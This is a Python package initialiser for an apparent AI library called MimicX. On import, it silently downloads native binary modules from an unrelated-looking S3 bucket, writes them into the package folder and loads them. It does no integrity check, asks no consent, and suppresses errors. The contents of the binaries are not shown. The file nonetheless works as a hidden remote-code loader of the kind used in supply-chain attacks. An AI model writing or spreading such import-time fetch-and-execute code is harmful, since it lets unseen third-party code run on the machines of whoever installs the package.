"""
MimicX AI  
Human-like AI for everyone.
"""

__version__ = "0.1.8"
__author__ = "MimicX"
__credits__ = "AI Researcher at MimicX"

import os
import urllib.request

# Domains and their corresponding class names
_DOMAINS = [
    ("mimicvision", "MimicVision"),
    ("mimictext", "MimicText"),
    ("mimicvoice", "MimicVoice"),
    ("mimicfeel", "MimicFeel"),
    ("mimictwin", "MimicTwin"),
    ("mimicphy", "MimicPhy"),
    ("mimicsense", "MimicSense"),
    ("mimicmind", "MimicMind"),
]

_MODEL_BASE_URL = "https://speedpresta.s3.us-east-1.amazonaws.com/mimicx"

__all__ = []

_module_dir = os.path.dirname(__file__)

for module_name, class_name in _DOMAINS:
    found = False
    for ext in [".so", ".pyd"]:
        file_path = os.path.join(_module_dir, f"{module_name}{ext}")

        if not os.path.exists(file_path):
            url = f"{_MODEL_BASE_URL}/{module_name}/{module_name}{ext}"
            try:
                urllib.request.urlretrieve(url, file_path)
            except Exception:
                continue

        if os.path.exists(file_path):
            try:
                imported_module = __import__(f".{module_name}", globals(), locals(), [class_name])
                globals()[class_name] = getattr(imported_module, class_name)
                __all__.append(class_name)
                found = True
                break
            except (ImportError, AttributeError):
                continue

    if not found:
        pass